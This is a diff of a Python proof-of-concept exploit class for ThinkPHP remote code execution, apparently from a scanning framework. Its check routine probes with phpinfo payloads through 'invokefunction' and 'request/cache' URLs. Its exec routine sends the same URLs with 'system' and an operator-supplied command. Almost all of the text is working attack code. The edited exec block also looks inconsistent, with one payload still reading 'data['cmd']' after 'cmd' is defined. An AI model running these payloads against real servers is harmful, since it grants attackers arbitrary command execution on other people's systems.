@@ -29,14 +29,8 @@ class POC(Script):
         if self.base_url:
             pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                     "index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for poc in pocs:
                         url = path + poc
                         async with session.get(url=url) as res:
@@ -50,17 +44,12 @@ class POC(Script):
 
     async def exec(self):
         await self.get_url()
+        cmd = self.parameter['cmd']
         if self.base_url:
             pocs = ["/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s" %parse.quote_plus(data['cmd']),
-                    "/index.php?s=/index/\\think\\request/cache&key=%s|system" %parse.quote_plus(data['cmd'])]
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, 'public/'),
-                self.url_normpath(self.url, './'),
-                self.url_normpath(self.url, './public/'),
-            ]))
+                    "/index.php?s=/index/\\think\\request/cache&key=%s|system" %parse.quote_plus(cmd)]
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for poc in pocs:
                         url = path + poc
                         res = self.curl('get', url)
